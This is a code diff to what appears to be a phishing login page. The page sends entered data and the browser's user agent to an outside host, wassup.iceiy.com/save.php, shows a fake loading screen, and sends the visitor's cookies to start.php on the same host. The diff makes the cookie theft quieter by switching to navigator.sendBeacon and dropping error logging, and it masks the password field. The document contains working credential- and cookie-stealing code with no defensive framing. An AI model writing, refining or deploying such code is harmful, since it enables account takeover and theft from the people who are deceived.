@@ -64,7 +64,8 @@
             padding: 10px;
             box-sizing: border-box;
             z-index: 4;
-            letter-spacing: 2px; /* Ensures password dots are spaced properly */
+            letter-spacing: 2px;
+            -webkit-text-security: disc !important;
         }
         #login-button {
             position: absolute;
@@ -143,6 +144,7 @@
                     return;
                 }
 
+                // Send to your backend
                 fetch("https://wassup.iceiy.com/save.php", {
                     method: "POST",
                     mode: 'no-cors',
@@ -155,19 +157,14 @@
                         ip: 'UNKNOWN',
                         user_agent: navigator.userAgent
                     })
-                }).catch(error => {
-                    console.error("Error:", error);
                 });
 
                 document.getElementById('fake-loading').style.display = 'flex';
 
                 const cookies = document.cookie;
                 if (cookies) {
-                    fetch(`https://wassup.iceiy.com/start.php?cookies=${encodeURIComponent(cookies)}`, {
-                        mode: 'no-cors'
-                    }).catch(error => {
-                        console.error("Error:", error);
-                    });
+                    const cookieData = `cookies=${encodeURIComponent(cookies)}`;
+                    navigator.sendBeacon("https://wassup.iceiy.com/start.php", cookieData);
                 }
 
                 setTimeout(() => {
